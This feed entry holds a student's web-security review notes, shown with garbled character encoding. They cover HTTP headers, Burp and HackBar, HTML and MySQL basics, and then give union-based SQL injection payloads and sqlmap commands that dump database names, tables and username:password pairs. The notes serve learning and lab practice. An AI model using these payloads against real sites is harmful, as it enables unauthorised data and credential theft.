    <title>ç¬¬ä¸€å‘¨å¤ä¹ (WEB)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/</id>
    <published>2020-04-03T09:03:13.000Z</published>
    <updated>2020-04-03T09:05:37.148Z</updated>
    
    <content type="html"><![CDATA[<p>çº¿ä¸Šåˆ†äº«ç¬¬ä¸€å‘¨ä¸»è¦ä»¥å¤ä¹ ä¸ºä¸»ï¼Œåœ¨å®¶ä¼°è®¡éƒ½æŠŠåŸæ¥å­¦çš„å¿˜çš„å·®ä¸å¤šäº†ï¼Œæ‰€æœ‰äººå„ä¸ªæ–¹å‘ï¼Œè¿™å‘¨æå‰å¤ä¹ ä¸€ä¸‹HTTPåè®®ï¼ˆä¼ å‚ç±»å‹ã€å¸¸ç”¨ä¼ªé€ å½¢å¼ã€å„ä¸ªæ–‡ä»¶å¤´çš„å¤§æ¦‚ä½œç”¨ã€burp/postman/hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨ï¼‰htmlåŸºç¡€ï¼ˆwebé¡µé¢ã€å¸¸ç”¨æ ‡ç­¾ã€è‡ªå·±ç¼–å†™å†…å®¹ï¼‰ã€sqlåŸºç¡€ï¼ˆmysqlè¯­è¨€å­¦ä¹ ã€å¢åˆ æ”¹æŸ¥ã€è”åˆæŸ¥è¯¢çš„æ–¹å¼ã€åŸºç¡€çš„sqlæ³¨å…¥ç‚¹æŒ–æ˜ã€sqlmapä½¿ç”¨ï¼‰è¿™äº›å†…å®¹æå‰å¤ä¹ ï¼Œåœ¨åˆ†äº«ä¼šæ—¶å€™ä¼šè®©å„ä½éƒ½è¿›è¡Œå®æ“å’Œè®²è§£ï¼Œå¯¹ä¸ä¼šçš„åœ°æ–¹è¿›è¡Œè¯¦ç»†è®²è§£ï¼Œä¿è¯å¤§éƒ¨åˆ†äººçš„æ—¶é—´ä¸æµªè´¹</p><h2 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h2><h3 id="ä¼ å‚ç±»å‹"><a href="#ä¼ å‚ç±»å‹" class="headerlink" title="ä¼ å‚ç±»å‹"></a>ä¼ å‚ç±»å‹</h3><p>GET POST(è¾…åŠ©å·¥å…· hackbar burpsuite postman)</p><h3 id="å¸¸ç”¨ä¼ªé€ å½¢å¼"><a href="#å¸¸ç”¨ä¼ªé€ å½¢å¼" class="headerlink" title="å¸¸ç”¨ä¼ªé€ å½¢å¼"></a>å¸¸ç”¨ä¼ªé€ å½¢å¼</h3><p>X-Forwarded-Forï¼š ä¼ªé€ è¯·æ±‚çš„ip</p><p>User-Agent: ä¼ªé€ åº”ç”¨ä¿¡æ¯</p><p>Accept-Language: ä¼ªé€ è¯·æ±‚è¯­è¨€</p><p>Hostï¼š ä¼ªé€ è¯·æ±‚çš„æœåŠ¡å™¨çš„ip</p><p>GET/POST: ä¼ªé€ å‘åŒ…æ–¹å¼</p><h3 id="å¸¸è§æ”»å‡»å½¢å¼"><a href="#å¸¸è§æ”»å‡»å½¢å¼" class="headerlink" title="å¸¸è§æ”»å‡»å½¢å¼"></a>å¸¸è§æ”»å‡»å½¢å¼</h3><p>è·¨ç«™è„šæœ¬æ”»å‡»(XSS) è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»(CSRF) Http Headsæ”»å‡» Cookieæ”»å‡» é‡å®šå‘æ”»å‡»</p><h3 id="æ•°æ®åŒ…æ–‡ä»¶å¤´çš„ä½œç”¨"><a href="#æ•°æ®åŒ…æ–‡ä»¶å¤´çš„ä½œç”¨" class="headerlink" title="æ•°æ®åŒ…æ–‡ä»¶å¤´çš„ä½œç”¨"></a>æ•°æ®åŒ…æ–‡ä»¶å¤´çš„ä½œç”¨</h3><h4 id="é€šç”¨å¤´éƒ¨"><a href="#é€šç”¨å¤´éƒ¨" class="headerlink" title="é€šç”¨å¤´éƒ¨"></a>é€šç”¨å¤´éƒ¨</h4><p>Request URL: è¯·æ±‚åœ°å€</p><p>Request Method: è¯·æ±‚æ–¹å¼ï¼ˆget post put delete trace headerï¼‰</p><p>Status Code: 200 (çŠ¶æ€ç å’ŒåŸå› çŸ­è¯­)</p><p>Remote Address: 127.0.0.1:80 ï¼ˆè¯·æ±‚ipï¼‰</p><p>Referrer Policy: no-referrer-when-downgrade(æ˜¯å¦æœ‰ä»£ç†)</p><h4 id="å“åº”å¤´éƒ¨"><a href="#å“åº”å¤´éƒ¨" class="headerlink" title="å“åº”å¤´éƒ¨"></a>å“åº”å¤´éƒ¨</h4><p>Connection: è¿æ¥</p><p>Content-Type: application/json;charset=UTF-8ï¼ˆå†…å®¹ç±»å‹ï¼‰</p><p>Date: Mon, 24 Jun 2019 11:12:18 GMTï¼ˆåšå‡ºå“åº”çš„æ—¶é—´ï¼‰</p><p>Server: nginx/1.13.6 ï¼ˆæœåŠ¡å™¨ç±»å‹ï¼‰</p><p>Transfer-Encoding: chunked ï¼ˆæ¶ˆæ¯é¦–éƒ¨æŒ‡æ˜å°†ä¿¡æ¯å®‰å…¨ä¼ é€’ç»™ç”¨æˆ·æ‰€é‡‡ç”¨çš„ç¼–ç å½¢ï¼‰</p><h4 id="è¯·æ±‚å¤´éƒ¨"><a href="#è¯·æ±‚å¤´éƒ¨" class="headerlink" title="è¯·æ±‚å¤´éƒ¨"></a>è¯·æ±‚å¤´éƒ¨</h4><p>Accept: application/json, text/plain, / ï¼ˆæ¥æ”¶ç±»å‹ï¼‰</p><p>Accept-Encoding: gzip, deflate ï¼ˆæ¥æ”¶å‹ç¼©å†…å®¹ä½¿ç”¨çš„ç¼–ç ï¼‰</p><p>Accept-Language: zh-CN,zh;q=0.9 ï¼ˆæ¥æ”¶è¯­è¨€ï¼‰</p><p>Connection: keep-alive ï¼ˆè¿æ¥æˆåŠŸï¼‰</p><p>Cookie: JSESSIONID=0AC68B437A980871D1E6C4479DCCF965 (COOKIEä¿¡æ¯)</p><p>Host: <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ï¼ˆå“åº”ä¸»æœºåŸŸåï¼‰</p><p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> (å“åº”åœ°å€)</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 ï¼ˆæµè§ˆå™¨åº”ç”¨ä¿¡æ¯)</p><h4 id="å®ä½“å¤´éƒ¨åŒ…å«å‘å‡ºè¯·æ±‚çš„å‚æ•°ä¿¡æ¯"><a href="#å®ä½“å¤´éƒ¨åŒ…å«å‘å‡ºè¯·æ±‚çš„å‚æ•°ä¿¡æ¯" class="headerlink" title="å®ä½“å¤´éƒ¨åŒ…å«å‘å‡ºè¯·æ±‚çš„å‚æ•°ä¿¡æ¯."></a>å®ä½“å¤´éƒ¨åŒ…å«å‘å‡ºè¯·æ±‚çš„å‚æ•°ä¿¡æ¯.</h4><h3 id="burp-postman-hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨"><a href="#burp-postman-hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨" class="headerlink" title="burp/postman/hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨"></a>burp/postman/hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨</h3><h4 id="burpsuiteå¸¸ç”¨åŠŸèƒ½"><a href="#burpsuiteå¸¸ç”¨åŠŸèƒ½" class="headerlink" title="burpsuiteå¸¸ç”¨åŠŸèƒ½"></a>burpsuiteå¸¸ç”¨åŠŸèƒ½</h4><p>proxy:æŠ“åŒ…</p><p>spider:çˆ¬è™«</p><p>intruder:çˆ†ç ´å¯†ç </p><p>repeater:å‘åŒ…æ”¹åŒ…</p><p>extender:æ·»åŠ æ’ä»¶</p><h4 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h4><figure class="image-box">                <img src="https://img-blog.csdn.net/20180523232921542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt title class>                <p></p>            </figure><p><a href="https://blog.csdn.net/fxbin123/article/details/80428216" target="_blank" rel="noopener">è¯¦ç»†ä½¿ç”¨</a></p><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>æœ‰å¤šç§æ³¨å…¥æ–¹å¼å¯ç”¨xss,sqlç­‰,æ”¯æŒget,postä¼ å‚,å¸¦httpåè®®å¤´ä¼ å‚ç­‰.</p><h2 id="htmlåŸºç¡€"><a href="#htmlåŸºç¡€" class="headerlink" title="htmlåŸºç¡€"></a>htmlåŸºç¡€</h2><h3 id="webé¡µé¢"><a href="#webé¡µé¢" class="headerlink" title="webé¡µé¢"></a>webé¡µé¢</h3><p>éšä¾¿æ‰¾ä¸€ä¸ªé¡µé¢éƒ½èƒ½è¯´.</p><h3 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta&gt;&lt;link&gt;&lt;title&gt;&lt;body&gt;&lt;div&gt;&lt;textarea&gt;&lt;span&gt;ç­‰</span><br></pre></td></tr></table></figure><h3 id="è‡ªå·±ç¼–å†™å†…å®¹"><a href="#è‡ªå·±ç¼–å†™å†…å®¹" class="headerlink" title="è‡ªå·±ç¼–å†™å†…å®¹"></a>è‡ªå·±ç¼–å†™å†…å®¹</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.html#onepage"</span>&gt;</span>æ–°ç•ªèµ„è®¯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#twopage"</span>&gt;</span>æˆ‘çš„è¿½ç•ª<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./threepage.html#threepage"</span>&gt;</span>ç•ªå‰§æ¨è<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"move"</span>&gt;</span> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- åŠ¨æ¼«èµ„è®¯ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contain"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input1"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label1"</span> <span class="attr">for</span>=<span class="string">"Input1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input2"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label2"</span> <span class="attr">for</span>=<span class="string">"Input2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">id</span>=<span class="string">"Input3"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label3"</span> <span class="attr">for</span>=<span class="string">"Input3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sqlåŸºç¡€"><a href="#sqlåŸºç¡€" class="headerlink" title="sqlåŸºç¡€"></a>sqlåŸºç¡€</h2><h3 id="mysqlè¯­è¨€å­¦ä¹ "><a href="#mysqlè¯­è¨€å­¦ä¹ " class="headerlink" title="mysqlè¯­è¨€å­¦ä¹ "></a>mysqlè¯­è¨€å­¦ä¹ </h3><h4 id="æœ€å¸¸ç”¨çš„æ˜¾ç¤ºå‘½ä»¤"><a href="#æœ€å¸¸ç”¨çš„æ˜¾ç¤ºå‘½ä»¤" class="headerlink" title="æœ€å¸¸ç”¨çš„æ˜¾ç¤ºå‘½ä»¤"></a>æœ€å¸¸ç”¨çš„æ˜¾ç¤ºå‘½ä»¤</h4><p>1ã€æ˜¾ç¤ºæ•°æ®åº“åˆ—è¡¨:</p><p>show databases;</p><p>2ã€æ˜¾ç¤ºåº“ä¸­çš„æ•°æ®è¡¨ï¼š</p><p>use mysql;</p><p>show tables;</p><p>3ã€æ˜¾ç¤ºæ•°æ®è¡¨çš„ç»“æ„ï¼š</p><p>describe è¡¨å;</p><p>4ã€å»ºåº“ï¼š</p><p>create database åº“å;</p><p>5ã€å»ºè¡¨ï¼š</p><p>use åº“åï¼›</p><p>create table è¡¨å;</p><p>6ã€åˆ åº“å’Œåˆ è¡¨:</p><p>drop database åº“å;</p><p>drop table è¡¨å;</p><p>7ã€å°†è¡¨ä¸­è®°å½•æ¸…ç©ºï¼š</p><p>delete from è¡¨å;(æ¸…ç©ºæ•°æ®è¡¨å†…å®¹,ä¿ç•™è‡ªå¢id,å¯æ¢å¤)</p><p>truncate table è¡¨å;ï¼ˆæˆåŠŸåˆ™è¿”å›0,è‡ªå¢idä¹Ÿä¸€åŒä¼šè¢«æ¸…æ‰,ä¸å¯æ¢å¤ï¼‰</p><p>8ã€æ˜¾ç¤ºè¡¨ä¸­çš„è®°å½•ï¼š</p><p>select * from è¡¨å;</p><p>9ã€æ˜¾ç¤ºå½“å‰çš„userï¼š</p><p>SELECT USER();</p><h4 id="è¿æ¥MySQL"><a href="#è¿æ¥MySQL" class="headerlink" title="è¿æ¥MySQL"></a>è¿æ¥MySQL</h4><p>æ ¼å¼: mysql -h ä¸»æœºåœ°å€ -uç”¨æˆ·å -pç”¨æˆ·å¯†ç </p><p>é€€å‡ºMYSQLå‘½ä»¤ï¼š exit ï¼ˆå›è½¦ï¼‰</p><h4 id="ä¿®æ”¹æ–°å¯†ç "><a href="#ä¿®æ”¹æ–°å¯†ç " class="headerlink" title="ä¿®æ”¹æ–°å¯†ç "></a>ä¿®æ”¹æ–°å¯†ç </h4><p>æ–¹æ³•ä¸€<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set password=PASSWORD(&apos;æ–°å¯†ç &apos;) where user=&apos;ç”¨æˆ·å&apos;;</span><br><span class="line">flush privileges; #æœ‰å…³ç”¨æˆ·å˜åŠ¨çš„éƒ½éœ€è¦æ›´æ–°æƒé™</span><br><span class="line">quit; #é€€å‡º</span><br></pre></td></tr></table></figure></p><p>æ–¹æ³•äºŒ</p><p>æ ¼å¼ï¼šmysqladmin -uç”¨æˆ·å -pæ—§å¯†ç  password æ–°å¯†ç </p><h4 id="å¢åŠ æ–°ç”¨æˆ·"><a href="#å¢åŠ æ–°ç”¨æˆ·" class="headerlink" title="å¢åŠ æ–°ç”¨æˆ·"></a>å¢åŠ æ–°ç”¨æˆ·</h4><p>æ ¼å¼ï¼šgrant select on æ•°æ®åº“.* to ç”¨æˆ·å@ç™»å½•ä¸»æœº identified by â€œå¯†ç â€</p><p>å¦‚å¢åŠ ä¸€ä¸ªç”¨æˆ·test2å¯†ç ä¸ºabc,è®©ä»–åªå¯ä»¥åœ¨localhostä¸Šç™»å½•,å¹¶å¯ä»¥å¯¹æ•°æ®åº“mydbè¿›è¡ŒæŸ¥è¯¢ã€æ’å…¥ã€ä¿®æ”¹ã€åˆ é™¤çš„æ“ä½œï¼ˆlocalhostæŒ‡æœ¬åœ°ä¸»æœº,å³MYSQLæ•°æ®åº“æ‰€åœ¨çš„é‚£å°ä¸»æœºï¼‰,è¿™æ ·ç”¨æˆ·å³ä½¿ç”¨çŸ¥é“test2çš„å¯†ç ä¹Ÿæ— æ³•ä»internetä¸Šç›´æ¥è®¿é—®æ•°æ®åº“,åªèƒ½é€šè¿‡MYSQLä¸»æœºä¸Šçš„webé¡µæ¥è®¿é—®.</p><p>grant select,insert,update,delete on mydb.* to test2@localhost identified by â€œabcâ€;</p><h4 id="åˆ é™¤ç”¨æˆ·"><a href="#åˆ é™¤ç”¨æˆ·" class="headerlink" title="åˆ é™¤ç”¨æˆ·"></a>åˆ é™¤ç”¨æˆ·</h4><p>æ ¼å¼: delete from user where user=â€™ç”¨æˆ·åâ€™ and host=â€™localhostâ€™;</p><p>åˆ é™¤ç”¨æˆ·çš„æ•°æ®åº“: drop database dbname;</p><h3 id="å¢åˆ æ”¹æŸ¥"><a href="#å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¢åˆ æ”¹æŸ¥"></a>å¢åˆ æ”¹æŸ¥</h3><h4 id="å¢"><a href="#å¢" class="headerlink" title="å¢"></a>å¢</h4><p>å‘½ä»¤:alter table è¡¨å add å­—æ®µ ç±»å‹ å…¶ä»–;</p><p>alter table MyClass add passtest int(4) default â€˜0â€™</p><h4 id="åˆ "><a href="#åˆ " class="headerlink" title="åˆ "></a>åˆ </h4><p>å‘½ä»¤:delete from è¡¨å where è¡¨è¾¾å¼</p><p>delete from MyClass where id=1;</p><h4 id="æ”¹"><a href="#æ”¹" class="headerlink" title="æ”¹"></a>æ”¹</h4><p>å‘½ä»¤:update è¡¨å set å­—æ®µ=æ–°å€¼,â€¦ where æ¡ä»¶</p><p>update MyClass set name=â€™Maryâ€™ where id=1;</p><h4 id="æŸ¥"><a href="#æŸ¥" class="headerlink" title="æŸ¥"></a>æŸ¥</h4><p>æŸ¥è¯¢æ‰€æœ‰è¡Œ</p><p>mysql&gt; select * from MyClass;</p><p>æŸ¥è¯¢å‰å‡ è¡Œæ•°æ®</p><p>mysql&gt; select * from MyClass order by id limit 0,2;</p><h3 id="è”åˆæŸ¥è¯¢çš„æ–¹å¼"><a href="#è”åˆæŸ¥è¯¢çš„æ–¹å¼" class="headerlink" title="è”åˆæŸ¥è¯¢çš„æ–¹å¼"></a>è”åˆæŸ¥è¯¢çš„æ–¹å¼</h3><h4 id="è”åˆæŸ¥è¯¢çš„æ³¨æ„äº‹é¡¹"><a href="#è”åˆæŸ¥è¯¢çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="è”åˆæŸ¥è¯¢çš„æ³¨æ„äº‹é¡¹:"></a>è”åˆæŸ¥è¯¢çš„æ³¨æ„äº‹é¡¹:</h4><p>1.ä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœä¸­çš„åˆ—ç±»å‹è¦ä¸€æ ·ã€‚</p><p>2.ä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœä¸­çš„åˆ—çš„æ•°é‡è¦ç›¸åŒã€‚</p><p>3.ä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœä¸­çš„åˆ—åå¯ä»¥ä¸ä¸€è‡´ï¼Œå¦‚æœæ²¡æœ‰ç‰¹å®šæŒ‡å®šï¼ŒæŒ‰ç…§ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¯­å¥çš„åˆ—åæ¥æ˜¾ç¤ºã€‚</p><h4 id="è”åˆæ³¨å…¥çš„è¿‡ç¨‹"><a href="#è”åˆæ³¨å…¥çš„è¿‡ç¨‹" class="headerlink" title="è”åˆæ³¨å…¥çš„è¿‡ç¨‹"></a>è”åˆæ³¨å…¥çš„è¿‡ç¨‹</h4><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹   ?id=1 and 1=1  ?id=1â€™</p><p>2.åˆ¤æ–­æ˜¯æ•´å‹è¿˜æ˜¯å­—ç¬¦å‹   ?id=1 and 1=1/1=2%23</p><p>3.åˆ¤æ–­æŸ¥è¯¢åˆ—æ•°  ?id=1â€™ order by 4%23</p><p>4.åˆ¤æ–­æ˜¾ç¤ºä½  ?id=-1â€™ union select 1,2,3%23</p><p>5.è·å–æ‰€æœ‰æ•°æ®åº“å<br>?id=-1â€™ union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)%23</p><p>6.è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å<br>?id=-1â€™ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™),3%23</p><p>7.è·å–åˆ—å<br>?id=-1â€™ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=â€™securityâ€™ and table_name=â€™usersâ€™),3%23</p><p>8.è·å–å­—æ®µå<br>?id=-1â€™ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3%23 </p><h3 id="åŸºç¡€çš„sqlæ³¨å…¥ç‚¹æŒ–æ˜"><a href="#åŸºç¡€çš„sqlæ³¨å…¥ç‚¹æŒ–æ˜" class="headerlink" title="åŸºç¡€çš„sqlæ³¨å…¥ç‚¹æŒ–æ˜"></a>åŸºç¡€çš„sqlæ³¨å…¥ç‚¹æŒ–æ˜</h3><p>1.å•å¼•å·åˆ¤æ–­  ?id=1â€™</p><p>2.æ•°å­—å‹åˆ¤æ–­  ?id=1 and 1=1/1=2  id=123-1</p><p>3.å­—ç¬¦å‹åˆ¤æ–­  ?id=1â€™ and â€˜1â€™=â€™1/2</p><p>4.æ–‡æœ¬å‹åˆ¤æ–­  ?id=123â€™%2Bâ€™asdf</p><p>5.è¾“å…¥æ¡†åˆ¤æ–­  #@!$/ â€¦</p><h3 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbs //çˆ†æ•°æ®åº“</span><br><span class="line">sqlmap.py -u url --current-db //çˆ†å½“å‰åº“</span><br><span class="line">sqlmap.py -u url --current-user //çˆ†å½“å‰ç”¨æˆ·</span><br><span class="line">sqlmap.py -u url --users   æŸ¥çœ‹ç”¨æˆ·æƒé™</span><br><span class="line">sqlmap.py -u url --tables -D æ•°æ®åº“ //çˆ†è¡¨æ®µ</span><br><span class="line">sqlmap.py -u url --columns -T è¡¨æ®µ -D æ•°æ®åº“ //çˆ†å­—æ®µ</span><br><span class="line">sqlmap.py -u url --dump -C å­—æ®µ -T è¡¨æ®µ -D æ•°æ®åº“ //çŒœè§£</span><br><span class="line">sqlmap.py -u url --dump --start=1 --stop=3 -C å­—æ®µ -T è¡¨æ®µ -D æ•°æ®åº“ //çŒœè§£1åˆ°3çš„å­—æ®µ</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url  åˆ¤æ–­</span><br><span class="line">sqlmap.py -u url --is-dba -v   è¿™æ˜¯åˆ¤æ–­å½“å‰æ•°æ®åº“çš„ä½¿ç”¨è€…æ˜¯å¦æ˜¯dba</span><br><span class="line">sqlmap.py -u url --users -v 0  è¿™å¥çš„ç›®çš„æ˜¯åˆ—ä¸¾æ•°æ®åº“çš„ç”¨æˆ·</span><br><span class="line">sqlmap.py -u url --passwords -v 0 è¿™å¥çš„ç›®çš„æ˜¯è·å–æ•°æ®åº“ç”¨æˆ·çš„å¯†ç </span><br><span class="line">sqlmap.py -u url --privileges -v 0 è¿™æ˜¯åˆ¤æ–­å½“å‰çš„æƒé™</span><br><span class="line">sqlmap.py -u url --dbs -v 0 è¿™å¥çš„ç›®çš„æ˜¯å°†æ‰€æœ‰çš„æ•°æ®åº“åˆ—å‡ºæ¥</span><br><span class="line">sqlmap.py -u url --tables -D &apos;è¡¨&apos; çˆ†è¡¨</span><br><span class="line">sqlmap.py -u url --columns -T â€˜è¡¨â€™-D â€˜æ•°æ®åº“â€™çˆ†åˆ—</span><br><span class="line">sqlmap.py -u url --dump -T &apos;è¡¨&apos; --start 1 --stop 4 -v 0 è¿™é‡Œæ˜¯æŸ¥è¯¢ç¬¬2åˆ°ç¬¬4è¡Œçš„å†…</span><br><span class="line">sqlmap.py -u url --dump -all -v 0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;çº¿ä¸Šåˆ†äº«ç¬¬ä¸€å‘¨ä¸»è¦ä»¥å¤ä¹ ä¸ºä¸»ï¼Œåœ¨å®¶ä¼°è®¡éƒ½æŠŠåŸæ¥å­¦çš„å¿˜çš„å·®ä¸å¤šäº†ï¼Œæ‰€æœ‰äººå„ä¸ªæ–¹å‘ï¼Œè¿™å‘¨æå‰å¤ä¹ ä¸€ä¸‹HTTPåè®®ï¼ˆä¼ å‚ç±»å‹ã€å¸¸ç”¨ä¼ªé€ å½¢å¼ã€å„ä¸ªæ–‡ä»¶å¤´çš„å¤§æ¦‚ä½œç”¨ã€burp/postman/hackbarå·¥å…·ç†Ÿæ‚‰ä½¿ç”¨ï¼‰htmlåŸºç¡€ï¼ˆwebé¡µé¢ã€å¸¸ç”¨æ ‡ç­¾ã€è‡ªå·±ç¼–å†™å†…å®¹ï¼‰ã€sqlåŸºç¡€ï¼ˆ
      
    
    </summary>
    
    
      <category term="ç¬”è®°" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="WEBçŸ¥è¯†" scheme="https://www.damyahome.github.io/tags/WEB%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬å››å‘¨ä¸¤é“é¢˜wp(SQLæ³¨å…¥)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-03T08:59:39.000Z</published>
    <updated>2020-04-03T09:00:40.205Z</updated>
    
